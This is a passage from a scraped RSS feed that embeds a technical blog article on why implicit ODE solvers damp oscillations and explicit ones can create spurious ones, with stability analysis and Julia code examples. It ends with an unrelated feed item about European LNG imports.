    &lt;p&gt;$$u’ = Au$$&lt;/p&gt;
    &lt;p&gt;where $A = f'(u)$, i.e. $A$ is the linear system defined by the Jacobian local to the point. This is effectively saying any “sufficiently nice” system (i.e. if $f$ isn’t some crazy absurd function and has properties like being differentiable), you can understand how things locally move by looking at the system approximated by a linear system, where the right linear approximation is given by the Jacobian. And we know that linear systems then boil down generally to just the scalar linear system, and so understanding the behavior of a solver on the scalar linear system tells us a lot about how it will do “for small enough h”.&lt;/p&gt;
    &lt;p&gt;Okay, there are lots of unanswered questions, such as what if $A$ is not diagonalizable? What if $f$ is not differentiable? What if the system is very nonlinear so the Jacobian changes very rapidly? But under assumptions that things are nice enough, we can say that if a solver does well on $u’ = \lambda u$ then it is probably some idea of good.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why implicit ODE solvers are “better”, i.e. more robust&lt;/head&gt;
    &lt;p&gt;So now we have a metric by which we can analyze ODEs: if they have good behavior on $u’ = \lambda u$, then they are likely to be good in general. So what does it mean to have good behavior on $u’ = \lambda u$? One nice property would be to at least be asymptotically correct for the most basic statement, i.e. does it go to zero when it should? If you have $u’ = \lambda u$ and $\lambda$ is negative, then the analytical solution $u(t) = \exp(\lambda t)u(0)$ goes to zero as $t$ goes to infinity. So a good question to ask is, for a given numerical method, for what values of $h$ (the time step size) does the numerical method give a solution that goes to zero, and for which $h$ does it get an infinitely incorrect answer?&lt;/p&gt;
    &lt;p&gt;To understand this, we just take a numerical method and plug in the test equation. So the first thing to look at is Euler’s method. For Euler’s method, we step forward by $h$ by assuming the derivative is constant along the interval, or:&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = u_n + hf(u_n)$$&lt;/p&gt;
    &lt;p&gt;When does this method give a solution that is asymptotically consistent? With a little bit of algebra:&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = u_n + h\lambda u_n$$&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = (1 + h\lambda) u_n$$&lt;/p&gt;
    &lt;p&gt;Let $z = h\lambda$, which means&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = (1 + z) u_n$$&lt;/p&gt;
    &lt;p&gt;This is a discrete dynamical system which has the analytical solution:&lt;/p&gt;
    &lt;p&gt;$$u_n = u_0 (1+z)^{n}$$&lt;/p&gt;
    &lt;p&gt;Note that if $1 + z &amp;gt; 1$, then $(1+z)^n$ keeps growing as $n$ increases, so this goes to infinity, while if $1 + z &amp;lt; 1$ it goes to zero. But since $\lambda$ can actually be a complex number, the analysis is a little bit more complex (pun intended), but it effectively means that if $z$ is in the unit circle shifted to the left in the complex plane by 1, then $u_n \rightarrow 0$. This gives us the definition of the stability region, $G(z)$ is the region for which $u_n \rightarrow 0$, and this is the shifted unit circle in the complex plane for explicit Euler.&lt;/p&gt;
    &lt;p&gt;This shows a pretty bad property for this method. For any given $\lambda$ with negative real part, there is a maximum $h$, actually $h = 1/\lambda$, such that for any larger step size we don’t just get a bad answer, we can get an infinitely bad answer, i.e. the analytical solution goes to zero but the numerical solution goes to infinity!&lt;/p&gt;
    &lt;p&gt;So, is there a method that doesn’t have this bad property? In comes the implicit methods. If you run the same analysis with implicit Euler,&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = u_n + hf(u_{n+1})$$&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = u_n + h\lambda u_{n+1}$$&lt;/p&gt;
    &lt;p&gt;$$(1-z) u_{n+1} = u_n$$&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = \frac{1}{1-z} u_n$$&lt;/p&gt;
    &lt;p&gt;Then we have almost an “inverse” answer, i.e. $G(z)$ is everything except the unit circle in the complex plane shifted to the right. This means that for any $\lambda$ with negative real part, for any $h$ the implicit Euler method has $u_n \rightarrow 0$, therefore it’s never infinitely wrong.&lt;/p&gt;
    &lt;p&gt;Therefore it’s just better, QED.&lt;/p&gt;
    &lt;p&gt;This then generalizes to more advanced methods. For example, the stability region of RK4&lt;/p&gt;
    &lt;p&gt;an explicit method has a maximum $h$, while the stability region of BDF2&lt;/p&gt;
    &lt;p&gt;an implicit method does not. You can even prove it’s impossible for any explicit method to have this “good” property, so “implicit methods are better”. QED times 2, done deal.&lt;/p&gt;
    &lt;head rend="h2"&gt;Wait a second, what about that other “wrongness”?&lt;/head&gt;
    &lt;p&gt;Any attentive student should immediately throw their hand up. “Teacher, given the $G(z)$ you said, you also have that for any $\lambda$ where $\text{Re}(\lambda)&amp;gt;1$, you also have that $u_n \rightarrow 0$, but in reality the analytical solution has $u(t) \rightarrow \infty$, so implicit Euler is infinitely wrong! And explicit Euler has the correct asymptotic behavior since it goes to infinity!”&lt;/p&gt;
    &lt;p&gt;That is completely correct! But it can be easy to brush this off with “practical concerns”. If you have a real model which has positive real eigenvalues like that, then it’s just going to explode to infinity. Those kinds of models aren’t really realistic? Energy goes to infinity, angular momentum goes to infinity, the chemical concentration goes to infinity: whatever you’re modeling just goes crazy! If you’re in this scenario, then your model is probably wrong. Or if the model isn’t wrong, the numerical methods aren’t very good anyways. If you analyze the error propagation properties, you’ll see the error of the numerical method also increases exponentially! So this is a case you shouldn’t be modeling anyways.&lt;/p&gt;
    &lt;head rend="h2"&gt;Seeing this robustness in practice&lt;/head&gt;
    &lt;p&gt;Therefore if you need a more accurate result, use an implicit method. And you don’t need to go to very difficult models to see this manifest in practice. Take the linear ODE:&lt;/p&gt;
    &lt;p&gt;$$T’ = 5(300-T)$$&lt;/p&gt;
    &lt;p&gt;with $T(0) = 320$. This is a simple model of cooling an object with a constant temperature influx. It’s easy to analytically solve, you just have an exponential fall in the temperature towards $T = 300$ the steady state. But when we solve it with an explicit method at default tolerances, that’s not what we see:&lt;/p&gt;
    &lt;quote&gt;using OrdinaryDiffEq function cooling(du,u,p,t) du[1] = 5.0*(300-u[1]) end u0 = [310.0] tspan = (0.0,10.0) prob = ODEProblem(cooling, u0, tspan) sol = solve(prob, Tsit5()) using Plots plot(sol, title="RK Method, Cooling Problem") savefig("rk_cooling.png")&lt;/quote&gt;
    &lt;p&gt;We see that the explicit method gives oscillations in the solution! Meanwhile, if we take a “robust” implicit method like the BDF method from the classic C++ library SUNDIALS, we can solve this:&lt;/p&gt;
    &lt;quote&gt;using Sundials sol = solve(prob, CVODE_BDF()) plot(sol, title="BDF Method, Cooling Problem") savefig("bdf_cooling.png")&lt;/quote&gt;
    &lt;p&gt;Sure it’s not perfectly accurate, but at least it doesn’t give extremely wrong behavior. We can decrease tolerances to make this all go away,&lt;/p&gt;
    &lt;p&gt;But the main point is that the explicit method is just generally “less robust”, you have to be more careful, it can give things that are just qualitatively wrong.&lt;/p&gt;
    &lt;p&gt;This means that “good tools”, tools that have a reputation for robustness, they should default to just using implicit solvers because that’s going to be better. And you see that in tools like Modelica. For example, the Modelica University’s playground and other tools in the space like OpenModelica and Dymola, default to implicit solvers like DASSL. And you can see they do great on this problem by default!&lt;/p&gt;
    &lt;p&gt;Modelica tools gives a good answer out of the box.&lt;/p&gt;
    &lt;p&gt;So QED, that’s the “right thing to do”: if you want to be robust, stick to implicit methods.&lt;/p&gt;
    &lt;head rend="h2"&gt;But why oscillations?&lt;/head&gt;
    &lt;p&gt;Hold up a bit… why does the explicit method give oscillations? While we know that’s wrong, it would be good to understand why it gives the qualitatively wrong behavior that it does. It turns out that this falls right out of the definition of the method. If you go back to the definition of explicit Euler on the test problem, i.e.&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = u_n + hf(u_n)$$&lt;/p&gt;
    &lt;p&gt;then substitute in:&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = (1 + h\lambda) u_{n}$$&lt;/p&gt;
    &lt;p&gt;If we think about our stability criteria $G(z)$ another way, its boundaries are exactly the value by which the next $u_{n+1}$ would have a negative real part. So the analytical solution is supposed to go to zero, but the “bad” behavior is when we choose a step size $h$ such that if we extrapolate out with a straight line for $h$ long in time, then we will “jump” over this zero, something that doesn’t happen in the analytical solution. But now let’s think about what happens in that case. If you jump over zero, then $u_n &amp;lt; 0$ (think real right now), so therefore the derivative of the next update points in the other direction, i.e. we're still going towards zero, but now from the negative side we go up to zero. But since $\|1 + h\lambda\| &amp;gt; 1$, we have that $\|u_{n+1}\| &amp;gt; \|u_n\|$, i.e. the norm of the solution keeps growing. So you jump from positive to negative, then negative to positive, then positive to negative, where the jumps are growing each time. This is the phantom oscillations of the explicit ODE solver!&lt;/p&gt;
    &lt;p&gt;So what’s happening is the default tolerances of the explicit ODE solver were large enough that the chosen $h$s were in the range of the phantom oscillation behavior, and so you just need to cap $h$ below that value, which is dependent on the real part of the eigenvalue of $h$ (you can do the same analysis with complex numbers, but that just gives rotations in the complex plane along with the real part oscillation).&lt;/p&gt;
    &lt;p&gt;But if explicit methods give oscillations, what’s going on with implicit ODE solvers with large $h$? Let’s look at the update equation again:&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = \frac{1}{1-z} u_n$$&lt;/p&gt;
    &lt;p&gt;now instead of multiplying each time by $(1-z)$, we divide by it. This means that when $\lambda &amp;lt; 0$ (or $\text{Re}(\lambda) &amp;lt; 0$ to be more exact), then for any $h$ we have that $\|u_{n+1}\| &amp;lt; \|u_{n}\|$. Therefore, we might jump over the zero with a big enough $h$, but we are guaranteed that our "jump size" is always shrinking. Thus for any $h$, we will get to zero because we're always shrinking in absolute value. This means that implicit methods are working because they have a natural dampening effect. So:&lt;/p&gt;
    &lt;head rend="h4"&gt;Explicit methods introduce spurious oscillations, but implicit methods naturally damp oscillations&lt;/head&gt;
    &lt;p&gt;This explains in more detail why we saw what we saw: the explicit method when the error tolerance is sufficiently high will introduce oscillations that don’t exist, while the implicit method will not have this behavior. This is a more refined version of the “energy doesn’t go to infinity!”, now it’s “energy doesn’t come from nowhere in real systems”, and because of this implicit solvers give a better qualitative answer. This is why they are more robust, which is why robust software for real engineers just always default to them.&lt;/p&gt;
    &lt;head rend="h2"&gt;Wait a second… do we always want that?&lt;/head&gt;
    &lt;p&gt;You should now be the student in the front row raising your hand, “implicit methods are always dampening… is that actually a good idea? Are you sure that’s always correct?” And the answer is… well it’s not. And that then gives us exactly the failure case for which implicit methods are less robust. If you have a system that is supposed to actually oscillate, then this “hey let’s always dampen everything to make solving more robust” actually leads to very wrong answers!&lt;/p&gt;
    &lt;p&gt;To highlight this, let’s just take a simple oscillator. You can think of this as a harmonic oscillator, or you can think about it as a simple model of a planet going around a star. However you want to envision it, you can write it out as a system of ODEs:&lt;/p&gt;
    &lt;p&gt;$$u_1′ = 500u_2$$&lt;lb/&gt; $$u_2′ = -500u_1$$&lt;/p&gt;
    &lt;p&gt;This is the linear ODE $u’ = Au$ where $A = [0\ 500; -500\ 0]$, which has complex eigenvalues with zero real part. In other words, the analytical solution is $\sin(500t)$ and $\cos(500t)$, just a pure oscillation that just keeps going around and around in circles. If we solve this with an explicit ODE solver:&lt;/p&gt;
    &lt;quote&gt;function f(du,u,p,t) du[1] = 500u[2] du[2] = -500u[1] end u0 = [1.0,1.0] tspan = (0.0,1.0) prob = ODEProblem(f, u0, tspan) sol = solve(prob, Tsit5()) plot(sol, title="RK Method", idxs=(1,2)) savefig("rk_oscillate.png")&lt;/quote&gt;
    &lt;p&gt;we can see that it generally gets the right answer. Over time you get some drift where the energy is slowly increasing due to numerical error in each step, but it’s going around in circles relatively well. However, our “robust implicit method”…&lt;/p&gt;
    &lt;quote&gt;sol = solve(prob, CVODE_BDF()) plot(sol, title="BDF Method", idxs=(1,2)) savefig("bdf_oscillate.png")&lt;/quote&gt;
    &lt;p&gt;is just not even close. And you can see that even our “robust Modelica tools” completely fall apart:&lt;/p&gt;
    &lt;p&gt;It says the answer goes to zero! Even when the analytical solution is just a circle! But we can understand why this is the case: the software developers made the implicit assumption that “dampening oscillations is always good, because generally that’s what happens in models, so let’s always do this by default so people get better answers”, and the result of this choice is that if someone puts in a model of the Earth going around the sun, then oops the Earth hits the sun pretty quickly.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion: ODE solvers make trade-offs, you need to make the right ones for your domain&lt;/head&gt;
    &lt;p&gt;This gives us the conclusion: there is no “better” or “more robust” ODE solver method, it’s domain-specific. This is why the Julia ODE solver package has hundreds of methods, because each domain can be asking for different properties that they want out of the method. Explicit methods are not generally faster, they are also something that tends to preserve (or generate) oscillations. Implicit methods are not generally more robust, they are methods which work by dampening transients, which is a good idea for some models but not for others. But then there’s a ton of nuance. For example, can you construct an explicit ODE solver so that on such oscillations you don’t get energy growth? You can! Anas5(w) is documented as “4th order Runge-Kutta method designed for periodic problems. Requires a periodicity estimate w which when accurate the method becomes 5th order (and is otherwise 4th order with less error for better estimates)”, i.e. if you give it a canonical frequency 500 it will be able to do extremely well on this problem (and being a bit off in that estimate still works, it just has energy growth that is small).&lt;/p&gt;
    &lt;p&gt;What about what was mentioned at the beginning of the article, “for hyperbolic PDEs you need to use explicit methods”? This isn’t a “special behavior” of PDEs, this is simply because for this domain, for example advective models of fluids, you want to conserve fluid as it moves. If you choose an implicit method, it “dampens” the solver, which means you get that as you integrate you get less and less fluid, breaking the conservation laws and giving qualitatively very incorrect solutions. If you use explicit methods, you don’t have this extraneous dampening, and this gives a better looking solution. But you can go even further and develop methods for which, if $h$ is sufficiently small, then you get little to no dampening. These are SSP methods, which we say are “for Hyperbolic PDEs (Conservation Laws)” but in reality what we mean is “when you don’t want things to dampen”.&lt;/p&gt;
    &lt;p&gt;But the point is, you can’t just say “if you want a better solution, use an implicit solver”. Maybe in some domains and for some problems that is true, but in other domains and problems that’s not true. And many numerical issues can stem from the implicit assumptions that follow from the choice being made for the integrator. Given all of this, it should be no surprise that much of the Modelica community has had many problems handling fluid models, the general flow of “everything is a DAE” → “always use an implicit solver” → “fluid models always dampen” → “we need to fix the dampening” could be fixed by making different assumptions at the solver level.&lt;/p&gt;
    &lt;p&gt;So, the next time someone tells you should just use ode15s or scipy.integrate.radau in order to make things robust without knowing anything about your problem, say “umm actually”.&lt;/p&gt;
    &lt;head rend="h2"&gt;Little Extra Details&lt;/head&gt;
    &lt;p&gt;The article is concluded. But here’s a few points I couldn’t fit into the narrative I want to mention:&lt;/p&gt;
    &lt;head rend="h3"&gt;Trapezoidal is cool&lt;/head&gt;
    &lt;p&gt;One piece I didn’t fit in here is that the Trapezoidal method is cool. The dampening property comes from L-stability, i.e. $G(z) \rightarrow 0$ as $\text{Re}(z) \rightarrow -\infty$. This is a stricter form of stability, since instead of just being stable for any finite $\lambda$, this also enforces that you are stable at the limit of bigger lambdas. “Most” implicit solvers that are used in practice, like Implicit Euler, have this property, and you can show the dampening is directly related to this property. But you can have an implicit method that isn’t L-stable. Some of these methods include Adams-Bashforth-Moulton methods, which are not even A-stable so they tend to have stability properties and act more like explicit methods. But the Trapezoidal method is A-stable without being L-stable, so it doesn’t tend to dampen while it tends to be also pretty stable. Though it’s not as stable, and the difference between “is stable for any linear ODE” versus “actually stable for nonlinear ODEs” (i.e. B-stability) is pronounced on real-world stiff problems. What this means in human terms is that the Trapezoidal method tends to not be stable enough for hard stiff problems, but it also doesn’t artificially dampen, so it can be a good default in cases where you know you have “some stiffness” but also want to keep some oscillations. One particular case of this is in some electrical circuit models with natural oscillators.&lt;/p&gt;
    &lt;head rend="h3"&gt;Lower order methods have purposes too&lt;/head&gt;
    &lt;p&gt;“All ODE solvers have a purpose”, I give some talks that give the justification for many high order methods, so in general “higher order is good if you solve with stricter tolerances and need more precision”. But lower order methods can be better because the higher order methods require that more derivatives of $f$ are defined, and if that’s not the case (like derivative discontinuities), then lower order methods will be more efficient. So even implicit Euler has cases where it’s better than higher order BDF methods, and it has to do with “how nice” $f$ is.&lt;/p&gt;
    &lt;head rend="h3"&gt;BDF methods like DASSL are actually α-stable&lt;/head&gt;
    &lt;p&gt;I said that generally implicit methods that you use are A-stable. That’s also a small lie to make the narrative simpler. The BDF methods which Sundials, DASSL, LSODE, FBDF, etc. use are actually α-stable, which means that they are actually missing some angle α of the complex plane for stability. The stability regions look like this:&lt;/p&gt;
    &lt;p&gt;So these BDF methods are actually pretty bad for other reasons on very oscillatory problems! Meanwhile, things like Rosenbrock methods can also solve DAEs while actually being L-stable, which can make them more stable in many situations where there’s oscillations towards a steady state. So there’s a trade-off there… again every method has a purpose. But this is another “ode15s is more stable than ode23s”… “well actually…”&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45262151</guid><pubDate>Tue, 16 Sep 2025 13:41:51 +0000</pubDate></item><item><title>After escaping Russian energy dependence, Europe is locking itself in to US LNG</title><link>https://davekeating.substack.com/p/after-escaping-russian-energy-dependence</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45262346</guid><pubDate>Tue, 16 Sep 2025 13:56:54 +0000</pubDate></item></channel></rss>